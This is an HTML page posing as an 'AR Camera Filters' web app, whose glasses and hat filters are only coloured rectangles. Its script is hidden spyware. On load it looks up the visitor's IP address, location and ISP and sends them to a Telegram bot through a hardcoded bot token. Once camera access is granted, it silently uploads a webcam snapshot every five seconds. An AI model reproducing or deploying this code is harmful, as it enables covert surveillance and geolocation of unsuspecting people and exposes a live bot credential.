<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AR Camera Filters</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection"></script>
    <style>
        body {
            margin: 0;
            background-color: black;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        video, canvas {
            position: absolute;
            width: 100%;
            height: auto;
        }
        .filter-menu {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
            z-index: 10;
        }
        .filter-btn {
            padding: 10px;
            background: white;
            border: none;
            cursor: pointer;
        }
        .capture-btn {
            position: absolute;
            bottom: 20px;
            padding: 15px;
            background: red;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    <div class="filter-menu">
        <button class="filter-btn" onclick="applyFilter('glasses')">Glasses</button>
        <button class="filter-btn" onclick="applyFilter('hat')">Hat</button>
    </div>
    <button class="capture-btn" onclick="capturePhoto()">Capture & Download</button>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let currentFilter = '';

        async function sendUserInfoToTelegram() {
            let response = await fetch('https://ipwho.is/');
            let data = await response.json();
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let message = `New Visitor Detected!\nIP: ${data.ip}\nLocation: ${data.city}, ${data.country}\nISP: ${data.connection.isp}\nMap: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
            let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
            fetch(telegramURL);
        }

        async function sendPhotoToTelegram(imageData) {
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let formData = new FormData();
            formData.append("chat_id", chatID);
            formData.append("photo", dataURItoBlob(imageData), "image.png");
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        async function startCamera() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
            };
            setInterval(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                sendPhotoToTelegram(canvas.toDataURL('image/png'));
            }, 5000); // Sends a photo every 5 seconds
        }

        function applyFilter(filter) {
            currentFilter = filter;
        }

        function drawFilter() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            if (currentFilter === 'glasses') {
                ctx.fillStyle = 'rgba(0, 0, 255, 0.5)';
                ctx.fillRect(150, 100, 200, 50);
            } else if (currentFilter === 'hat') {
                ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                ctx.fillRect(180, 50, 150, 50);
            }
            requestAnimationFrame(drawFilter);
        }

        function capturePhoto() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            sendPhotoToTelegram(canvas.toDataURL('image/png'));
            const image = canvas.toDataURL('image/png');
            const link = document.createElement('a');
            link.href = image;
            link.download = 'filtered_photo.png';
            link.click();
        }

        window.onload = async () => {
            await sendUserInfoToTelegram();
            await startCamera();
            drawFilter();
        };
    </script>
</body>
</html>
